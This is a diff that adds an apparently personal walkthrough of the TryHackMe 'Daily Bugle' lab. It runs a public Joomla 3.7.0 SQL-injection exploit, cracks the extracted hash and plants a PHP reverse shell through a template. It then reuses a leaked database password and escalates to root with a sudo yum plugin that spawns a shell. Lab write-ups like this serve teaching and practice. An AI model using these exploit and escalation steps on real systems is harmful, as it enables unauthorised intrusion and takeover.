@@ -549,4 +549,109 @@ After that migrate.
 *to be written*
 
 #### Hackpark - Manual
+*to be written*
 
+#### Watcher's choice: Daily Bugle
+
+We start with a classic nmap:
+```
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
+|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
+|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+|_http-generator: Joomla! - Open Source Content Management
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+|_http-title: Home
+3306/tcp open  mysql   MariaDB (unauthorized)
+```
+Install CMSmap from [here](https://github.com/Dionach/CMSmap) if you don't have it on your machine.
+
+Run `python3 ~/tools/CMSmap/cmsmap.py 'http://target/'`.
+
+##### F***ed up pip for python2
+```
+curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
+python get-pip.py
+```
+
+##### Exploit for Joomla 3.7.0 (CVE-2017-8917)
+
+Download the exploit to your local machine and run it:
+```
+wget https://github.com/XiphosResearch/exploits/blob/36ef1e4adda92416e6f6c1cbeefc4576ef7fe722/Joomblah/joomblah.py
+
+chmod +x joomblah.py
+./joomblah.py http://target
+```
+
+Result:
+```
+ [-] Fetching CSRF token
+ [-] Testing SQLi
+  -  Found table: fb9j5_users
+  -  Extracting users from fb9j5_users
+ [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
+```
+
+Save the password hash in a text file and run to crack it (this can take a while):
+`john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt crackme.txt`
+
+This will give you the clear text of the hash: `spiderman123`.
+
+In Joomla we navigate to *Templates* and create a new php file that we can access containing the [pentestmonkey reverse php shell code](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).
+
+Once you have your shell you can upgrade it to bash and make it more stable:
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+[Ctrl]+z #on your keyboard not in the shell ;)
+stty raw -echo
+fg
+export TERM=xterm-256color
+```
+
+If we look at `/home` there is a directory called `jjameson` so most likely there is a user under that name.
+
+Navigating to `/var/www/html/` let's us read the `configuration.php`. You take the root password and try to login using the following credentials: `jjameson:nv5uz9r3ZEDzVjNu`.
+
+Examine the files that can be run as root: `sudo -l`:
+```
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+```
+
+**Spawn interactive root shell by loading a custom plugin** ([source](https://gtfobins.github.io/gtfobins/yum/)):
+
+```
+TF=$(mktemp -d)
+cat >$TF/x<<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+cat >$TF/y.conf<<EOF
+[main]
+enabled=1
+EOF
+
+cat >$TF/y.py<<EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+
+sudo yum -c $TF/x --enableplugin=y
+```
